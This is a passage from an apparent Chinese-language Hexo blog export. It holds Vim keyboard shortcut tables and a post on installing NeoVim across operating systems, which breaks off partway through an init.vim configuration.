<td style="text-align:left"><code>&#125;</code></td>
<td style="text-align:left">跳转到下一段</td>
</tr>
<tr>
<td style="text-align:left"><code>[[</code></td>
<td style="text-align:left">跳转到上一部分</td>
</tr>
<tr>
<td style="text-align:left"><code>]]</code></td>
<td style="text-align:left">跳转到下一部分</td>
</tr>
<tr>
<td style="text-align:left"><code>[]</code></td>
<td style="text-align:left">跳转到上一部分的末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>][</code></td>
<td style="text-align:left">跳转到上一部分的开头</td>
</tr>
</tbody>
</table>
</div>
<h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>a</code></td>
<td style="text-align:left">在光标后插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>A</code></td>
<td style="text-align:left">在行末插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>i</code></td>
<td style="text-align:left">在光标前插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>o</code></td>
<td style="text-align:left">（小写字母 o）在光标下方新开一行</td>
</tr>
<tr>
<td style="text-align:left"><code>O</code></td>
<td style="text-align:left">（大写字母 O）在光标上方新开一行</td>
</tr>
<tr>
<td style="text-align:left"><code>:r [filename]</code></td>
<td style="text-align:left">在光标下方插入文件 [filename] 的内容</td>
</tr>
<tr>
<td style="text-align:left"><code>:r ![command]</code></td>
<td style="text-align:left">执行命令 [command] ，并将输出插入至光标下方</td>
</tr>
</tbody>
</table>
</div>
<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>x</code></td>
<td style="text-align:left">删除光标处字符</td>
</tr>
<tr>
<td style="text-align:left"><code>dw</code></td>
<td style="text-align:left">删除一个词</td>
</tr>
<tr>
<td style="text-align:left"><code>d0</code></td>
<td style="text-align:left">删至行首</td>
</tr>
<tr>
<td style="text-align:left"><code>d$</code></td>
<td style="text-align:left">删至行末</td>
</tr>
<tr>
<td style="text-align:left"><code>d)</code></td>
<td style="text-align:left">删至句末</td>
</tr>
<tr>
<td style="text-align:left"><code>dgg</code></td>
<td style="text-align:left">删至文件开头</td>
</tr>
<tr>
<td style="text-align:left"><code>dG</code></td>
<td style="text-align:left">删至文件末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>dd</code></td>
<td style="text-align:left">删除该行</td>
</tr>
<tr>
<td style="text-align:left"><code>3dd</code></td>
<td style="text-align:left">删除三行</td>
</tr>
</tbody>
</table>
</div>
<h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>r&#123;text&#125;</code></td>
<td style="text-align:left">将光标处的字符替换成 {text}</td>
</tr>
<tr>
<td style="text-align:left"><code>R</code></td>
<td style="text-align:left">进入覆写模式，输入的字符将替换原有的字符</td>
</tr>
</tbody>
</table>
</div>
<h3 id="撤销重做"><a href="#撤销重做" class="headerlink" title="撤销重做"></a>撤销重做</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>u</code></td>
<td style="text-align:left">撤销最后的操作</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+r</code></td>
<td style="text-align:left">重做最后撤销的操作</td>
</tr>
</tbody>
</table>
</div>
<h3 id="搜索、替换"><a href="#搜索、替换" class="headerlink" title="搜索、替换"></a>搜索、替换</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>/search_text</code></td>
<td style="text-align:left">检索文档，在文档后面的部分搜索 search_text</td>
</tr>
<tr>
<td style="text-align:left"><code>?search_text</code></td>
<td style="text-align:left">检索文档，在文档前面的部分搜索 search_text</td>
</tr>
<tr>
<td style="text-align:left"><code>n</code></td>
<td style="text-align:left">移动到后一个检索结果</td>
</tr>
<tr>
<td style="text-align:left"><code>N</code></td>
<td style="text-align:left">移动到前一个检索结果</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement</code></td>
<td style="text-align:left">检索第一个 “original” 字符串并将其替换成 “replacement”</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement/g</code></td>
<td style="text-align:left">检索并将所有的 “original” 替换为 “replacement”</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement/gc</code></td>
<td style="text-align:left">检索出所有的 “original” 字符串，但在替换成 “replacement” 前，先询问是否替换</td>
</tr>
</tbody>
</table>
</div>
<h4 id="书签"><a href="#书签" class="headerlink" title="书签"></a>书签</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>m &#123;a-zA-Z&#125;</code></td>
<td style="text-align:left">在当前光标位置设置书签，书签名可用一个大小写字母（{a-zA-Z}）</td>
</tr>
<tr>
<td style="text-align:left"><code>:marks</code></td>
<td style="text-align:left">列出所有书签</td>
</tr>
<tr>
<td style="text-align:left"><code>&#123;a-zA-Z&#125;</code></td>
<td style="text-align:left">跳转到书签 {a-zA-Z}</td>
</tr>
</tbody>
</table>
</div>
<h3 id="可视模式"><a href="#可视模式" class="headerlink" title="可视模式"></a>可视模式</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>v</code></td>
<td style="text-align:left">进入逐字可视模式</td>
</tr>
<tr>
<td style="text-align:left"><code>V</code></td>
<td style="text-align:left">进入逐行可视模式</td>
</tr>
<tr>
<td style="text-align:left"><code>Esc</code></td>
<td style="text-align:left">退出可视模式</td>
</tr>
</tbody>
</table>
</div>
<h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>~</code></td>
<td style="text-align:left">切换大小写</td>
</tr>
<tr>
<td style="text-align:left"><code>d</code></td>
<td style="text-align:left">删除一个词</td>
</tr>
<tr>
<td style="text-align:left"><code>c</code></td>
<td style="text-align:left">变更</td>
</tr>
<tr>
<td style="text-align:left"><code>y</code></td>
<td style="text-align:left">复制</td>
</tr>
<tr>
<td style="text-align:left"><code>&gt;</code></td>
<td style="text-align:left">右移</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;</code></td>
<td style="text-align:left">左移</td>
</tr>
<tr>
<td style="text-align:left"><code>!</code></td>
<td style="text-align:left">通过外部命令进行过滤</td>
</tr>
</tbody>
</table>
</div>
<h3 id="保存、退出"><a href="#保存、退出" class="headerlink" title="保存、退出"></a>保存、退出</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>:q</code></td>
<td style="text-align:left">退出 Vim，如果文件已被修改，将退出失败</td>
</tr>
<tr>
<td style="text-align:left"><code>:w</code></td>
<td style="text-align:left">保存文件</td>
</tr>
<tr>
<td style="text-align:left"><code>:w new_name</code></td>
<td style="text-align:left">用 new_name 作为文件名保存文件</td>
</tr>
<tr>
<td style="text-align:left"><code>:wq</code></td>
<td style="text-align:left">保存文件并退出 Vim</td>
</tr>
<tr>
<td style="text-align:left"><code>:q!</code></td>
<td style="text-align:left">退出 Vim，不保存文件改动</td>
</tr>
<tr>
<td style="text-align:left"><code>ZZ</code></td>
<td style="text-align:left">退出 Vim，如果文件被改动过，保存改动内容</td>
</tr>
<tr>
<td style="text-align:left"><code>ZQ</code></td>
<td style="text-align:left">与 :q! 相同，退出 Vim，不保存文件改动</td>
</tr>
</tbody>
</table>
</div>
<h1 id="编辑视图"><a href="#编辑视图" class="headerlink" title="编辑视图"></a>编辑视图</h1><h2 id="插件-1"><a href="#插件-1" class="headerlink" title="插件"></a>插件</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>Ctrl+d</code></td>
<td style="text-align:left"><code>&lt;Esc&gt;:set cmdheight=2&lt;CR&gt;a</code></td>
<td style="text-align:left">修改命令行行数</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+t</code></td>
<td style="text-align:left"><code>&lt;Esc&gt;:set cmdheight=10&lt;CR&gt;a</code></td>
<td style="text-align:left">修改命令行行数</td>
</tr>
</tbody>
</table>
</div>
<h1 id="可视模式-1"><a href="#可视模式-1" class="headerlink" title="可视模式"></a>可视模式</h1><h2 id="插件-2"><a href="#插件-2" class="headerlink" title="插件"></a>插件</h2><div class="table-container">
<table>
<thead>
<tr>
<th>按键</th>
<th>映射键</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>i&#39;</code>, <code>i&quot;</code>, <code>i)</code>, <code>i]</code>, <code>i&#125;</code></td>
<td></td>
<td>选中’, “, ), ]内的内容 (符号正反都可)</td>
</tr>
<tr>
<td><code>ip</code></td>
<td></td>
<td>选中段落</td>
</tr>
<tr>
<td><code>it</code></td>
<td></td>
<td>选中html标签内的内容</td>
</tr>
</tbody>
</table>
</div>
<h1 id="vim默认快捷键-1"><a href="#vim默认快捷键-1" class="headerlink" title="vim默认快捷键"></a>vim默认快捷键</h1><h2 id="控制光标-1"><a href="#控制光标-1" class="headerlink" title="控制光标"></a>控制光标</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>h</code></td>
<td style="text-align:left">光标向左移动一个字符</td>
</tr>
<tr>
<td style="text-align:left"><code>j</code> 或 <code>Ctrl + J</code></td>
<td style="text-align:left">光标向下移动一行</td>
</tr>
<tr>
<td style="text-align:left"><code>k</code> 或 <code>Ctrl + P</code></td>
<td style="text-align:left">光标向上移动一行</td>
</tr>
<tr>
<td style="text-align:left"><code>l</code></td>
<td style="text-align:left">光标向右移动一个字符</td>
</tr>
<tr>
<td style="text-align:left"><code>0</code></td>
<td style="text-align:left">（数字 0）移动光标至本行开头</td>
</tr>
<tr>
<td style="text-align:left"><code>$</code></td>
<td style="text-align:left">移动光标至本行末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>^</code></td>
<td style="text-align:left">移动光标至本行第一个非空字符处</td>
</tr>
<tr>
<td style="text-align:left"><code>w</code></td>
<td style="text-align:left">向前移动一个词 （上一个字母和数字组成的词之后）</td>
</tr>
<tr>
<td style="text-align:left"><code>W</code></td>
<td style="text-align:left">向前移动一个词 （以空格分隔的词）</td>
</tr>
<tr>
<td style="text-align:left"><code>5w</code></td>
<td style="text-align:left">向前移动五个词</td>
</tr>
<tr>
<td style="text-align:left"><code>b</code></td>
<td style="text-align:left">向后移动一个词 （下一个字母和数字组成的词之前）</td>
</tr>
<tr>
<td style="text-align:left"><code>B</code></td>
<td style="text-align:left">向后移动一个词 （以空格分隔的词）</td>
</tr>
<tr>
<td style="text-align:left"><code>5b</code></td>
<td style="text-align:left">向后移动五个词</td>
</tr>
<tr>
<td style="text-align:left"><code>G</code></td>
<td style="text-align:left">移动至文件末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>gg</code></td>
<td style="text-align:left">移动至文件开头</td>
</tr>
</tbody>
</table>
</div>
<h2 id="文档预览-1"><a href="#文档预览-1" class="headerlink" title="文档预览"></a>文档预览</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>(</code></td>
<td style="text-align:left">跳转到上一句</td>
</tr>
<tr>
<td style="text-align:left"><code>)</code></td>
<td style="text-align:left">跳转到下一句</td>
</tr>
<tr>
<td style="text-align:left"><code>&#123;</code></td>
<td style="text-align:left">跳转到上一段</td>
</tr>
<tr>
<td style="text-align:left"><code>&#125;</code></td>
<td style="text-align:left">跳转到下一段</td>
</tr>
<tr>
<td style="text-align:left"><code>[[</code></td>
<td style="text-align:left">跳转到上一部分</td>
</tr>
<tr>
<td style="text-align:left"><code>]]</code></td>
<td style="text-align:left">跳转到下一部分</td>
</tr>
<tr>
<td style="text-align:left"><code>[]</code></td>
<td style="text-align:left">跳转到上一部分的末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>][</code></td>
<td style="text-align:left">跳转到上一部分的开头</td>
</tr>
</tbody>
</table>
</div>
<h2 id="插入-1"><a href="#插入-1" class="headerlink" title="插入"></a>插入</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>a</code></td>
<td style="text-align:left">在光标后插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>A</code></td>
<td style="text-align:left">在行末插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>i</code></td>
<td style="text-align:left">在光标前插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>o</code></td>
<td style="text-align:left">（小写字母 o）在光标下方新开一行</td>
</tr>
<tr>
<td style="text-align:left"><code>O</code></td>
<td style="text-align:left">（大写字母 O）在光标上方新开一行</td>
</tr>
<tr>
<td style="text-align:left"><code>:r [filename]</code></td>
<td style="text-align:left">在光标下方插入文件 [filename] 的内容</td>
</tr>
<tr>
<td style="text-align:left"><code>:r ![command]</code></td>
<td style="text-align:left">执行命令 [command] ，并将输出插入至光标下方</td>
</tr>
</tbody>
</table>
</div>
<h2 id="删除-1"><a href="#删除-1" class="headerlink" title="删除"></a>删除</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>x</code></td>
<td style="text-align:left">删除光标处字符</td>
</tr>
<tr>
<td style="text-align:left"><code>dw</code></td>
<td style="text-align:left">删除一个词</td>
</tr>
<tr>
<td style="text-align:left"><code>d0</code></td>
<td style="text-align:left">删至行首</td>
</tr>
<tr>
<td style="text-align:left"><code>d$</code></td>
<td style="text-align:left">删至行末</td>
</tr>
<tr>
<td style="text-align:left"><code>d)</code></td>
<td style="text-align:left">删至句末</td>
</tr>
<tr>
<td style="text-align:left"><code>dgg</code></td>
<td style="text-align:left">删至文件开头</td>
</tr>
<tr>
<td style="text-align:left"><code>dG</code></td>
<td style="text-align:left">删至文件末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>dd</code></td>
<td style="text-align:left">删除该行</td>
</tr>
<tr>
<td style="text-align:left"><code>3dd</code></td>
<td style="text-align:left">删除三行</td>
</tr>
</tbody>
</table>
</div>
<h2 id="替换-1"><a href="#替换-1" class="headerlink" title="替换"></a>替换</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>r&#123;text&#125;</code></td>
<td style="text-align:left">将光标处的字符替换成 {text}</td>
</tr>
<tr>
<td style="text-align:left"><code>R</code></td>
<td style="text-align:left">进入覆写模式，输入的字符将替换原有的字符</td>
</tr>
</tbody>
</table>
</div>
<h2 id="撤销重做-1"><a href="#撤销重做-1" class="headerlink" title="撤销重做"></a>撤销重做</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>u</code></td>
<td style="text-align:left">撤销最后的操作</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+r</code></td>
<td style="text-align:left">重做最后撤销的操作</td>
</tr>
</tbody>
</table>
</div>
<h2 id="搜索、替换-1"><a href="#搜索、替换-1" class="headerlink" title="搜索、替换"></a>搜索、替换</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>/search_text</code></td>
<td style="text-align:left">检索文档，在文档后面的部分搜索 search_text</td>
</tr>
<tr>
<td style="text-align:left"><code>?search_text</code></td>
<td style="text-align:left">检索文档，在文档前面的部分搜索 search_text</td>
</tr>
<tr>
<td style="text-align:left"><code>n</code></td>
<td style="text-align:left">移动到后一个检索结果</td>
</tr>
<tr>
<td style="text-align:left"><code>N</code></td>
<td style="text-align:left">移动到前一个检索结果</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement</code></td>
<td style="text-align:left">检索第一个 “original” 字符串并将其替换成 “replacement”</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement/g</code></td>
<td style="text-align:left">检索并将所有的 “original” 替换为 “replacement”</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement/gc</code></td>
<td style="text-align:left">检索出所有的 “original” 字符串，但在替换成 “replacement” 前，先询问是否替换</td>
</tr>
</tbody>
</table>
</div>
<h3 id="书签-1"><a href="#书签-1" class="headerlink" title="书签"></a>书签</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>m &#123;a-zA-Z&#125;</code></td>
<td style="text-align:left">在当前光标位置设置书签，书签名可用一个大小写字母（{a-zA-Z}）</td>
</tr>
<tr>
<td style="text-align:left"><code>:marks</code></td>
<td style="text-align:left">列出所有书签</td>
</tr>
<tr>
<td style="text-align:left"><code>&#123;a-zA-Z&#125;</code></td>
<td style="text-align:left">跳转到书签 {a-zA-Z}</td>
</tr>
</tbody>
</table>
</div>
<h2 id="可视模式-2"><a href="#可视模式-2" class="headerlink" title="可视模式"></a>可视模式</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>v</code></td>
<td style="text-align:left">进入逐字可视模式</td>
</tr>
<tr>
<td style="text-align:left"><code>V</code></td>
<td style="text-align:left">进入逐行可视模式</td>
</tr>
<tr>
<td style="text-align:left"><code>Esc</code></td>
<td style="text-align:left">退出可视模式</td>
</tr>
</tbody>
</table>
</div>
<h2 id="修改-1"><a href="#修改-1" class="headerlink" title="修改"></a>修改</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>~</code></td>
<td style="text-align:left">切换大小写</td>
</tr>
<tr>
<td style="text-align:left"><code>d</code></td>
<td style="text-align:left">删除一个词</td>
</tr>
<tr>
<td style="text-align:left"><code>c</code></td>
<td style="text-align:left">变更</td>
</tr>
<tr>
<td style="text-align:left"><code>y</code></td>
<td style="text-align:left">复制</td>
</tr>
<tr>
<td style="text-align:left"><code>&gt;</code></td>
<td style="text-align:left">右移</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;</code></td>
<td style="text-align:left">左移</td>
</tr>
<tr>
<td style="text-align:left"><code>!</code></td>
<td style="text-align:left">通过外部命令进行过滤</td>
</tr>
</tbody>
</table>
</div>
<h2 id="保存、退出-1"><a href="#保存、退出-1" class="headerlink" title="保存、退出"></a>保存、退出</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>:q</code></td>
<td style="text-align:left">退出 Vim，如果文件已被修改，将退出失败</td>
</tr>
<tr>
<td style="text-align:left"><code>:w</code></td>
<td style="text-align:left">保存文件</td>
</tr>
<tr>
<td style="text-align:left"><code>:w new_name</code></td>
<td style="text-align:left">用 new_name 作为文件名保存文件</td>
</tr>
<tr>
<td style="text-align:left"><code>:wq</code></td>
<td style="text-align:left">保存文件并退出 Vim</td>
</tr>
<tr>
<td style="text-align:left"><code>:q!</code></td>
<td style="text-align:left">退出 Vim，不保存文件改动</td>
</tr>
<tr>
<td style="text-align:left"><code>ZZ</code></td>
<td style="text-align:left">退出 Vim，如果文件被改动过，保存改动内容</td>
</tr>
<tr>
<td style="text-align:left"><code>ZQ</code></td>
<td style="text-align:left">与 :q! 相同，退出 Vim，不保存文件改动</td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <categories>
        <category>vim</category>
      </categories>
      <tags>
        <tag>NeoVim</tag>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>NeoVim飞升过程</title>
    <url>/posts/c94f96f/</url>
    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><ul>
<li><p>Scoop : <code>scoop install neovim</code></p>
</li>
<li><p>Chocolatey : <code>choco install neovim</code></p>
</li>
</ul>
<h2 id="macOS-OS-X"><a href="#macOS-OS-X" class="headerlink" title="macOS / OS X"></a>macOS / OS X</h2><ul>
<li><p>brew : <code>brew install neovim</code></p>
</li>
<li><p>Macports : <code>sudo port selfupdate &amp;&amp; sudo port install neovim</code></p>
</li>
</ul>
<a id="more"></a>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Linux-AppImage通用包"><a href="#Linux-AppImage通用包" class="headerlink" title="Linux AppImage通用包"></a>Linux AppImage通用包</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -LO https://github.com/neovim/neovim/releases/download/stable/nvim.appimage</span><br><span class="line">chmod u+x nvim.appimage</span><br><span class="line">./nvim.appimage</span><br></pre></td></tr></table></figure>
<h3 id="常见Linux发行版"><a href="#常见Linux发行版" class="headerlink" title="常见Linux发行版"></a>常见Linux发行版</h3><ul>
<li><p><strong>Arch Linux</strong> : <code>sudo pacman -S neovim</code></p>
<p>python模块 : <code>sudo pacman -S python-pynvim</code>  ,Python2 和 Ruby 模块 <code>python2-neovim</code> 、<code>ruby-neovim</code></p>
</li>
<li><p><strong>CentOS / RHEL</strong> : </p>
<p>Neovim可通过EPEL（企业Linux的额外软件包）获得</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm</span><br><span class="line"><span class="comment"># python模块</span></span><br><span class="line">yum install -y neovim python3-neovim</span><br><span class="line"><span class="comment"># 在较旧的版本上，可能需要python2-neovim</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>Debian</strong> : <code>sudo apt-get install neovim</code></p>
<p>python模块 : <code>sudo apt-get install python-neovim</code> 、<code>sudo apt-get install python3-neovim</code></p>
</li>
<li><p><strong>Fedora</strong> : <code>sudo dnf install -y neovim python3-neovim</code></p>
</li>
<li><p><strong>Ubuntu</strong> : <code>sudo apt install neovim</code></p>
<p>python模块 : <code>sudo apt install python-neovim</code> 、<code>sudo apt install python3-neovim</code></p>
<p>旧版Ubuntu使用:</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python-software-properties</span><br><span class="line">sudo add-apt-repository ppa:neovim-ppa/stable</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install neovim</span><br><span class="line"></span><br><span class="line"><span class="comment"># python模块</span></span><br><span class="line">sudo apt-get install python-dev python-pip python3-dev python3-pip</span><br><span class="line">sudo apt-get install python-dev python-pip python3-dev</span><br><span class="line">sudo apt-get install python3-setuptools</span><br><span class="line">sudo easy_install3 pip</span><br></pre></td></tr></table></figure>
<h2 id="BSD-Unix"><a href="#BSD-Unix" class="headerlink" title="BSD (Unix)"></a>BSD (Unix)</h2><ul>
<li><p><strong>FreeBSD</strong> : <code>pkg install neovim</code></p>
<p>python模块 : <code>pkg install py27-pynvim py36-pynvim</code></p>
</li>
<li><p><strong>OpenBSD</strong> : <code>pkg_add neovim</code></p>
</li>
</ul>
<p><a href="https://github.com/neovim/neovim/wiki/Installing-Neovim">更多产考官方wiki</a></p>
<h1 id="美化飞升"><a href="#美化飞升" class="headerlink" title="美化飞升"></a>美化飞升</h1><p>若已经有vim的配置，可使用<code>ln -s .vim/vimrc .config/nvim/init.vim</code>与vim共用配置，可能有不兼容情况，尽量新建<code>nvim ~/.config/nvim/init.vim</code></p>
<p>状态栏美化插件,需要安装powerline-fonts字体（<a href="https://github.com/powerline/fonts）">https://github.com/powerline/fonts）</a> #sudo pacman -S powerline-fonts</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot;                               _ ____    _   ___     ___           ____   ____</span></span><br><span class="line"><span class="comment">&quot;   ___  ___  _ __  _   _ _ __ ( ) ___|  | \ | \ \   / (_)_ __ ___ |  _ \ / ___|</span></span><br><span class="line"><span class="comment">&quot;  / _ \/ _ \| &#x27;_ \| | | | &#x27;_ \|/\___ \  |  \| |\ \ / /| | &#x27;_ ` _ \| |_) | |</span></span><br><span class="line"><span class="comment">&quot; |  __/ (_) | | | | |_| | | | |  ___) | | |\  | \ V / | | | | | | |  _ &lt;| |___</span></span><br><span class="line"><span class="comment">&quot;  \___|\___/|_| |_|\__,_|_| |_| |____/  |_| \_|  \_/  |_|_| |_| |_|_| \_\\____|</span></span><br><span class="line"><span class="comment">&quot;</span></span><br><span class="line"><span class="comment">&quot;  =================================木He寸&amp;eonun================================</span></span><br><span class="line"><span class="comment">&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; i 写入模式、i插入之前、I行首插入、a插入之后、A行尾插入、o下行插入、O上行插入、x 删除光标后一个字符</span></span><br><span class="line"><span class="comment">&quot; &lt;Operation(操作)&gt; &lt;Motion(动作)&gt;</span></span><br><span class="line"><span class="comment">&quot; d 剪切操作(剪切可看做删除), y 复制操作, p 粘贴操作， c 剪切后修改操作</span></span><br><span class="line"><span class="comment">&quot; ← 左动作， → 右动作， 3← 3个左动作， b 选择光标开启到上一个词后的内容， i 指明光标在词中，当前词待操作， w 选择光标开始到下个词前的内容， iw 在当前词之间选择该， y3← 向右复制， f 查找动作</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;&gt;首次使用自动配置</span></span><br><span class="line"><span class="comment">&quot; ===</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==安装plug</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">empty</span>(<span class="built_in">glob</span>(<span class="string">&#x27;~/.config/nvim/autoload/plug.vim&#x27;</span>))</span><br><span class="line">	<span class="keyword">silent</span> !curl -fLo ~/.config/nvim/autoload/plug.<span class="keyword">vim</span> --create-dirs</span><br><span class="line">		\ http<span class="variable">s:</span>//raw.githubusercontent.<span class="keyword">com</span>/junegunn/<span class="keyword">vim</span>-plug/master/plug.<span class="keyword">vim</span></span><br><span class="line">	<span class="keyword">autocmd</span> VimEnter * PlugInstall --<span class="keyword">sync</span> | <span class="keyword">source</span> $MYVIMRC</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 保存vimrc时立即重新加载生效</span></span><br><span class="line"><span class="keyword">autocmd</span> BufWritePost $MYVIMRC <span class="keyword">source</span> $MYVIMRC</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;&gt;基础配置</span></span><br><span class="line"><span class="comment">&quot; ===START===</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 文件类型检测</span></span><br><span class="line"><span class="keyword">filetype</span> <span class="keyword">on</span></span><br><span class="line"><span class="keyword">filetype</span> <span class="built_in">indent</span> <span class="keyword">on</span></span><br><span class="line"><span class="keyword">filetype</span> plugin <span class="keyword">on</span></span><br><span class="line"><span class="keyword">filetype</span> plugin <span class="built_in">indent</span> <span class="keyword">on</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 开启语法高亮</span></span><br><span class="line"><span class="keyword">if</span> !exists(<span class="string">&quot;g:syntax_on&quot;</span>)</span><br><span class="line">    <span class="keyword">syntax</span> enable</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; txt文件按照wiki语法高亮</span></span><br><span class="line"><span class="keyword">autocmd</span> BufNewFile *.txt <span class="keyword">set</span> ft=confluencewiki</span><br><span class="line"><span class="keyword">autocmd</span> BufEnter *.txt <span class="keyword">set</span> ft=confluencewiki</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 恢复上次文件打开位置</span></span><br><span class="line"><span class="keyword">au</span> BufReadPost * <span class="keyword">if</span> <span class="built_in">line</span>(<span class="string">&quot;&#x27;\&quot;&quot;</span>) &gt; <span class="number">0</span>|<span class="keyword">if</span> <span class="built_in">line</span>(<span class="string">&quot;&#x27;\&quot;&quot;</span>) &lt;= <span class="built_in">line</span>(<span class="string">&quot;$&quot;</span>)|<span class="keyword">exe</span>(<span class="string">&quot;norm &#x27;\&quot;&quot;</span>)|<span class="keyword">else</span>|<span class="keyword">exe</span> <span class="string">&quot;norm 